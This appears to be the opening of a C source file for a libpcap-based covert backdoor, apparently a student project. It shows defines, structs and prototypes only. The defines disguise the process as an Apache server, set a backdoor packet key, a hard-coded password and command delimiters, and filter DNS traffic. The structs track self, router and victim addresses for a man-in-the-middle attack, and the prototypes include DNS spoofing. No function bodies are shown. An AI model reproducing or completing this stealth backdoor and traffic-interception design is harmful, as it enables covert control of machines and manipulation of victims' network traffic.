#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/prctl.h>
#include <unistd.h>

#define SIZE_ETHERNET 14
#define MASK "/usr/sbin/apache2 -k start -DSSL"

#define ETHER_IP_UDP_LEN 44
#define MAX_SIZE 1024
#define BACKDOOR_HEADER_KEY "foobar"
#define BACKDOOR_HEADER_LEN 4
#define PASSLEN 8
#define PASSWORD "password"
#define BUFFSIZE 512
#define COMMAND_START ">start<<<"
#define COMMAND_END ">>>end<"
#define SYSOF "tmp1"
#define SYSEF "tmp2"
#define FILTER "udp and port 53"
#define NUMPKT 5


// tcpdump header (ether.h) defines ETHER_HDRLEN)
#ifndef ETHER_HDRLEN
#define ETHER_HDRLEN 14
#endif

// Function Prototypes
u_int16_t handle_ethernet (u_char *,const struct pcap_pkthdr* ,const u_char*);
void handle_IP (u_char *,const struct pcap_pkthdr* ,const u_char* );
void handle_TCP (u_char *,const struct pcap_pkthdr* ,const u_char*);
void handle_UDP (u_char *,const struct pcap_pkthdr*,const u_char*);
void print_payload (const u_char *, int);
void print_hex_ascii_line (const u_char *, int, int);
void prx_payload(const u_char *, int);
void pkt_callback (u_char*, const struct pcap_pkthdr*, const u_char*);
pcap_t* get_nicd();
void dnss(pcap_t*, char*);
void psmask(char *);
unsigned char swapIN(unsigned char);
int cryptIN(char *, char *);

/*
 * Structure of an internet header, stripped of all options.
 *
 * This is taken directly from the tcpdump source
 *
 * We declare ip_len and ip_off to be short, rather than u_short
 * pragmatically since otherwise unsigned comparisons can result
 * against negative integers quite easily, and fail in subtle ways.
 */
struct my_ip {
	u_int8_t	ip_vhl;		/* header length, version */
#define IP_V(ip)	(((ip)->ip_vhl & 0xf0) >> 4)
#define IP_HL(ip)	((ip)->ip_vhl & 0x0f)
	u_int8_t	ip_tos;		/* type of service */
	u_int16_t	ip_len;		/* total length */
	u_int16_t	ip_id;		/* identification */
	u_int16_t	ip_off;		/* fragment offset field */
#define	IP_DF 0x4000			/* dont fragment flag */
#define	IP_MF 0x2000			/* more fragments flag */
#define	IP_OFFMASK 0x1fff		/* mask for fragmenting bits */
	u_int8_t	ip_ttl;		/* time to live */
	u_int8_t	ip_p;		/* protocol */
	u_int16_t	ip_sum;		/* checksum */
	struct	in_addr ip_src,ip_dst;	/* source and dest address */
};

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

/* UDP header */
struct sniff_udp {
        u_short uh_sport;               /* source port */
        u_short uh_dport;               /* destination port */
        u_short uh_len;                 /* window */
        u_short uh_sum;                 /* checksum */
};

struct mac_ip{
    unsigned char *mac;
    uint32_t ip;
};

struct mitm_t{
    pcap_t* nicd;
    struct mac_ip self;
    struct mac_ip rtr;
    struct mac_ip vic;
};

typedef unsigned char uch;

uch dnsbuf[BUFFSIZE];